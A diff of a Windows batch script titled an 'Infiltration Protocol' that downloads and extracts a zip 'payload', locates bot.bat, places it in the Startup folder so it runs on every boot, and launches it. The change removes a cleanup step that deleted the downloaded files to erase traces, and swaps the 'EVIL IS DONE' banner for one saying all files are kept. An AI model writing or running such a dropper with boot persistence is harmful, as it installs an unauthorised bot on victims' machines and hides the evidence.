@@ -3,6 +3,7 @@ setlocal enabledelayedexpansion
 
 echo ============================================
 echo   YING-YANG EMPEROR'S INFILTRATION PROTOCOL
+echo   NOTHING WILL BE ERASED
 echo ============================================
 echo.
 
@@ -27,6 +28,7 @@ if not exist "%zipfile%" (
     exit /b 1
 )
 echo [OK] Payload downloaded successfully.
+echo [*] Zip file kept at: %zipfile%
 echo.
 
 :: 2. EXTRACT
@@ -38,6 +40,7 @@ if not exist "%extractdir%" (
     exit /b 1
 )
 echo [OK] Zip extracted successfully.
+echo [*] Extracted folder kept at: %extractdir%
 echo.
 
 :: 3. HUNT bot.bat
@@ -76,17 +79,11 @@ start "" "%startup%\bot.bat"
 echo [OK] bot.bat launched in new process.
 echo.
 
-:: 6. CLEANUP
-echo [CLEANUP] Erasing traces...
-timeout /t 1 /nobreak >nul
-del /f /q "%zipfile%" >nul 2>&1
-echo [*] Deleted: %zipfile%
-rmdir /s /q "%extractdir%" >nul 2>&1
-echo [*] Deleted: %extractdir%
-echo.
-
 echo ============================================
-echo   MISSION COMPLETE - EVIL IS DONE
+echo   MISSION COMPLETE - ALL FILES PRESERVED
+echo   - Zip: %zipfile%
+echo   - Extracted: %extractdir%
+echo   - Startup: %startup%\bot.bat
 echo   bot.bat will execute on every system boot.
 echo ============================================
 pause
